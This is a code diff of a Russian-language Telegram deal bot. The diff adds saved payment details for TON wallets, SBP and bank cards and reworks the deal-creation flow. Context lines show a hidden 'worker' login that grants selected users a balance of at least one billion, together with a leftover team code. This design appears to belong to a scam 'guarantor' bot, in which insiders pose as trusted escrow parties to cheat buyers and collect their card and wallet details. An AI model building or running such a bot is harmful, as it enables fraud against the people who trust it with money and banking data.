@@ -1,3 +1,4 @@
+
 import sqlite3
 import uuid
 import logging
@@ -41,12 +42,37 @@ SUPPORT_CHAT_ID = int(os.getenv("SUPPORT_CHAT_ID", "0"))    # можно зад�
 
 # Воркеры
 WORKERS = set()
-WORKER_CODE = "astralteam"  # оставляем для совместимости, если когда-нибудь понадобится
 
 # Память в рантайме
 user_data = {}      # {user_id: {wallet, balance, successful_deals, lang}}
 deals = {}          # {deal_id: {amount, description, seller_id, buyer_id, wallet, valute}}
 admin_commands = {} # {user_id: 'command'}
+user_wallets = {}   # {user_id: {wallet_code: wallet_str}}
+
+# Карты типов кошельков
+WALLET_CODE_MAP = {
+    "TON-кошелька": "ton",
+    "СБП": "sbp",
+    "банковской карты (РФ)": "card_rf",
+    "банковской карты (UA)": "card_ua",
+    "STARS": "stars",
+}
+
+DEAL_WALLET_TYPE_MAP = {
+    "deal_wallet_ton": "TON-кошелька",
+    "deal_wallet_sbp": "СБП",
+    "deal_wallet_card_rf": "банковской карты (РФ)",
+    "deal_wallet_card_ua": "банковской карты (UA)",
+    "deal_wallet_stars": "STARS",
+}
+
+DEAL_VALUTE_MAP = {
+    "deal_wallet_ton": "TON",
+    "deal_wallet_sbp": "RUB",
+    "deal_wallet_card_rf": "RUB",
+    "deal_wallet_card_ua": "UAH",
+    "deal_wallet_stars": "STARS",
+}
 
 # ---------------------- БАЗА ----------------------
 DB_NAME = "bot_data.db"
@@ -68,7 +94,6 @@ def init_db():
         """
     )
 
-    # на всякий случай добавляем lang, если старый формат
     cursor.execute("PRAGMA table_info(users)")
     columns = cursor.fetchall()
     column_names = [c[1] for c in columns]
@@ -85,6 +110,17 @@ def init_db():
             buyer_id INTEGER,
             wallet TEXT,
             valute TEXT
+        )
+        """
+    )
+
+    cursor.execute(
+        """
+        CREATE TABLE IF NOT EXISTS user_wallets (
+            user_id INTEGER,
+            wallet_type TEXT,
+            wallet TEXT,
+            PRIMARY KEY (user_id, wallet_type)
         )
         """
     )
@@ -118,6 +154,11 @@ def load_data():
             "wallet": wallet or "",
             "valute": valute or VALUTE,
         }
+
+    # user_wallets
+    cursor.execute("SELECT user_id, wallet_type, wallet FROM user_wallets")
+    for user_id, wallet_type, wallet in cursor.fetchall():
+        user_wallets.setdefault(user_id, {})[wallet_type] = wallet or ""
 
     conn.close()
 
@@ -174,6 +215,26 @@ def delete_deal(deal_id: str):
     conn.close()
 
 
+def save_user_wallet(user_id: int, wallet_code: str, wallet_value: str):
+    """Сохраняем реквизиты для конкретного метода (TON, СБП, карта, STARS)."""
+    user_wallets.setdefault(user_id, {})[wallet_code] = wallet_value
+    conn = sqlite3.connect(DB_NAME)
+    cursor = conn.cursor()
+    cursor.execute(
+        """
+        INSERT OR REPLACE INTO user_wallets (user_id, wallet_type, wallet)
+        VALUES (?, ?, ?)
+        """,
+        (user_id, wallet_code, wallet_value),
+    )
+    conn.commit()
+    conn.close()
+
+
+def get_user_wallet(user_id: int, wallet_code: str):
+    return user_wallets.get(user_id, {}).get(wallet_code)
+
+
 def ensure_user_exists(user_id: int):
     if user_id not in user_data:
         user_data[user_id] = {
@@ -195,7 +256,6 @@ async def worker_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ensure_user_exists(user_id)
     WORKERS.add(user_id)
 
-    # балансу можно дать условно "огромное" значение, но в логике мы его не ограничиваем
     user_data[user_id]["balance"] = max(user_data[user_id].get("balance", 0.0), 1_000_000_000)
     save_user_data(user_id)
 
@@ -259,7 +319,6 @@ async def join_deal(user_id: int, chat_id: int, deal_id: str, context: ContextTy
     valute = deal.get("valute", VALUTE)
     wallet = deal.get("wallet") or user_data.get(seller_id, {}).get("wallet", "Не указан")
 
-    # сообщение покупателю
     await context.bot.send_message(
         chat_id,
         get_text(
@@ -367,7 +426,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         await context.bot.send_photo(
             chat_id,
-            photo="https://i.postimg.cc/8sHq27HV/astral.jpg",  # можешь заменить на своё
+            photo="https://i.postimg.cc/8sHq27HV/astral.jpg",
             caption=get_text(lang, "start_message"),
             reply_markup=InlineKeyboardMarkup(keyboard),
         )
@@ -378,7 +437,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Команда /buy <deal_id> — альтернативный вход в сделку, как у Treasure Safe."""
+    """Команда /buy <deal_id> — альтернативный вход в сделку."""
     if not update.message:
         return
     user_id = update.message.from_user.id
@@ -432,7 +491,7 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await start(update, context)
             return
 
-        # профиль (кнопку убрали из меню, но обработчик оставим на всякий случай)
+        # профиль (оставляем на случай, если где-то будет кнопка)
         if data == "profile":
             usr = user_data.get(user_id, {})
             username = query.from_user.username or "None"
@@ -454,11 +513,27 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        # управление кошельками (постоянные)
+        # управление постоянными кошельками
         if data == "wallet":
+            # показываем все сохранённые реквизиты (если есть)
+            saved_list = []
+            uw = user_wallets.get(user_id, {})
+            if "ton" in uw:
+                saved_list.append(f"TON: {uw['ton']}")
+            if "sbp" in uw:
+                saved_list.append(f"СБП: {uw['sbp']}")
+            if "card_rf" in uw:
+                saved_list.append(f"Карта РФ: {uw['card_rf']}")
+            if "card_ua" in uw:
+                saved_list.append(f"Карта UA: {uw['card_ua']}")
+            if "stars" in uw:
+                saved_list.append(f"STARS: {uw['stars']}")
+
+            info_text = "\n\n".join(saved_list) if saved_list else "У вас пока нет сохранённых реквизитов."
+
             await context.bot.send_message(
                 chat_id,
-                get_text(lang, "wallet_select_message"),
+                get_text(lang, "wallet_select_message") + "\n\n" + info_text,
                 reply_markup=InlineKeyboardMarkup(
                     [
                         [InlineKeyboardButton("💎 Добавить TON-кошелек", callback_data="wallet_ton")],
@@ -487,33 +562,30 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
 
         # выбор реквизитов и валюты ДЛЯ КОНКРЕТНОЙ СДЕЛКИ
-        if data in (
-            "deal_wallet_ton",
-            "deal_wallet_sbp",
-            "deal_wallet_card_rf",
-            "deal_wallet_card_ua",
-            "deal_wallet_stars",
-        ):
-            wallet_type_map = {
-                "deal_wallet_ton": "TON-кошелька",
-                "deal_wallet_sbp": "СБП",
-                "deal_wallet_card_rf": "банковской карты (РФ)",
-                "deal_wallet_card_ua": "банковской карты (UA)",
-                "deal_wallet_stars": "STARS",
-            }
-            valute_map = {
-                "deal_wallet_ton": "TON",
-                "deal_wallet_sbp": "RUB",
-                "deal_wallet_card_rf": "RUB",
-                "deal_wallet_card_ua": "UAH",
-                "deal_wallet_stars": "STARS",
-            }
-            wallet_type = wallet_type_map.get(data, "кошелька")
-            deal_valute = valute_map.get(data, VALUTE)
-            context.user_data["deal_wallet_type"] = wallet_type
+        if data in DEAL_WALLET_TYPE_MAP:
+            wallet_type = DEAL_WALLET_TYPE_MAP[data]
+            deal_valute = DEAL_VALUTE_MAP.get(data, VALUTE)
+            wallet_code = WALLET_CODE_MAP.get(wallet_type)
+
+            saved_wallet = get_user_wallet(user_id, wallet_code) if wallet_code else None
             context.user_data["deal_valute"] = deal_valute
-            context.user_data["awaiting_deal_wallet"] = True
-            await query.edit_message_text(get_text(lang, "wallet_type_prompt", wallet_type=wallet_type))
+
+            if saved_wallet:
+                # используем сохранённые реквизиты, сразу спрашиваем сумму
+                context.user_data["deal_wallet"] = saved_wallet
+                context.user_data["awaiting_amount"] = True
+                await query.edit_message_text(
+                    get_text(lang, "create_deal_message", valute=deal_valute),
+                    reply_markup=InlineKeyboardMarkup(
+                        [[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data="menu")]]
+                    ),
+                )
+            else:
+                # просим ввести реквизиты и параллельно сохраним
+                context.user_data["deal_wallet_type"] = wallet_type
+                context.user_data["deal_wallet_code"] = wallet_code
+                context.user_data["awaiting_deal_wallet"] = True
+                await query.edit_message_text(get_text(lang, "wallet_type_prompt", wallet_type=wallet_type))
             return
 
         # запуск создания сделки
@@ -523,11 +595,11 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 get_text(lang, "wallet_select_message"),
                 reply_markup=InlineKeyboardMarkup(
                     [
-                        [InlineKeyboardButton("💎 Добавить TON-кошелек", callback_data="deal_wallet_ton")],
-                        [InlineKeyboardButton("📱 Добавить СБП", callback_data="deal_wallet_sbp")],
-                        [InlineKeyboardButton("💳 Добавить банковскую карту (РФ)", callback_data="deal_wallet_card_rf")],
-                        [InlineKeyboardButton("💳 Добавить банковскую карту (UA)", callback_data="deal_wallet_card_ua")],
-                        [InlineKeyboardButton("⭐ Оплата в STARS", callback_data="deal_wallet_stars")],
+                        [InlineKeyboardButton("💎 TON", callback_data="deal_wallet_ton")],
+                        [InlineKeyboardButton("📱 СБП", callback_data="deal_wallet_sbp")],
+                        [InlineKeyboardButton("💳 Банковская карта (РФ)", callback_data="deal_wallet_card_rf")],
+                        [InlineKeyboardButton("💳 Банковская карта (UA)", callback_data="deal_wallet_card_ua")],
+                        [InlineKeyboardButton("⭐ STARS", callback_data="deal_wallet_stars")],
                         [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data="menu")],
                     ]
                 ),
@@ -760,16 +832,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # --- создание сделки: ввод реквизитов (ОДНОРАЗОВЫХ) ---
         if context.user_data.get("awaiting_deal_wallet"):
             wallet_type = context.user_data.get("deal_wallet_type", "кошелька")
+            wallet_code = context.user_data.get("deal_wallet_code")
             deal_wallet_value = f"{wallet_type}: {text}"
             context.user_data["deal_wallet"] = deal_wallet_value
             context.user_data["awaiting_deal_wallet"] = False
+
+            # сохраняем как постоянные реквизиты для этого метода
+            if wallet_code:
+                save_user_wallet(user_id, wallet_code, deal_wallet_value)
 
             deal_valute = context.user_data.get("deal_valute", VALUTE)
 
             context.user_data["awaiting_amount"] = True
             await update.message.reply_text(
                 get_text(lang, "create_deal_message", valute=deal_valute),
-                parse_mode="MarkdownV2",
                 reply_markup=InlineKeyboardMarkup(
                     [[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data="menu")]]
                 ),
@@ -785,7 +861,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 context.user_data["awaiting_description"] = True
                 await update.message.reply_text(
                     get_text(lang, "awaiting_description_message"),
-                    parse_mode="MarkdownV2",
                     reply_markup=InlineKeyboardMarkup(
                         [[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data="menu")]]
                     ),
@@ -868,6 +943,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 user_data[user_id]["wallet"] = wallet_value
                 save_user_data(user_id)
                 context.user_data.pop("awaiting_wallet", None)
+
+                # сохраняем в таблицу user_wallets, если тип известен
+                wallet_code = WALLET_CODE_MAP.get(wallet_type)
+                if wallet_code:
+                    save_user_wallet(user_id, wallet_code, wallet_value)
 
                 await update.message.reply_text(
                     get_text(lang, "wallet_updated_message", wallet=wallet_value),
